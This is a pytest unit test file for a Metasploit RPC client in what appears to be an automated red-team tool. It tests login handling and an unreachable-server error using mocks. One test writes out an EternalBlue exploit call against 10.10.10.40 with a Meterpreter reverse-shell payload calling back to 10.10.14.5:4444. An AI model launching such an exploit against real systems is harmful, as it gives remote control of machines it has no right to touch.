# tests/unit/tools/test_metasploit.py
import pytest
from unittest.mock import AsyncMock, patch, MagicMock
from autored.tools.metasploit import MsfRpcClient, MsfResult


def test_msf_client_init():
    client = MsfRpcClient(host="localhost", port=55553, password="test")
    assert client.host == "localhost"
    assert client.port == 55553
    assert client.password == "test"
    assert client.token is None


@pytest.mark.asyncio
async def test_msf_login():
    client = MsfRpcClient(host="localhost", port=55553, password="test")
    with patch("autored.tools.metasploit.httpx.AsyncClient") as mock_httpx:
        mock_response = MagicMock()
        mock_response.status_code = 200
        # msgpack-encoded ["auth.login", "tmp_token"] — msfrpcd returns
        # [method, token] for auth.login. The plan's login() takes token[1].
        # (Plan's original bytes b"\x92\xa3tmp_token" were malformed msgpack;
        # corrected to encode a real 2-element [method, token] response.)
        mock_response.content = b"\x92\xaaauth.login\xa9tmp_token"
        mock_client = AsyncMock()
        mock_client.__aenter__ = AsyncMock(return_value=mock_client)
        mock_client.__aexit__ = AsyncMock(return_value=None)
        mock_client.post = AsyncMock(return_value=mock_response)
        mock_httpx.return_value = mock_client

        token = await client.login()
        assert token == "tmp_token"
        assert client.token == "tmp_token"


@pytest.mark.asyncio
async def test_msf_login_failure():
    client = MsfRpcClient(host="localhost", port=55553, password="wrong")
    with patch("autored.tools.metasploit.httpx.AsyncClient") as mock_httpx:
        mock_response = MagicMock()
        mock_response.status_code = 401
        mock_client = AsyncMock()
        mock_client.__aenter__ = AsyncMock(return_value=mock_client)
        mock_client.__aexit__ = AsyncMock(return_value=None)
        mock_client.post = AsyncMock(return_value=mock_response)
        mock_httpx.return_value = mock_client

        with pytest.raises(Exception) as exc:
            await client.login()
        assert "login failed" in str(exc.value).lower() or "401" in str(exc.value)


@pytest.mark.asyncio
async def test_msf_execute_exploit():
    """Review Focus: Metasploit RPC unreachable returns clear error."""
    client = MsfRpcClient(host="localhost", port=55553, password="test")
    client.token = "fake_token"

    # Simulate connection refused
    with patch("autored.tools.metasploit.httpx.AsyncClient") as mock_httpx:
        mock_client = AsyncMock()
        mock_client.__aenter__ = AsyncMock(side_effect=ConnectionRefusedError("Connection refused"))
        mock_httpx.return_value = mock_client

        with pytest.raises(ConnectionRefusedError):
            await client.execute_exploit(
                module="exploit/windows/smb/ms17_010_eternalblue",
                target="10.10.10.40",
                payload="windows/x64/meterpreter/reverse_tcp",
                lhost="10.10.14.5",
                lport=4444,
            )
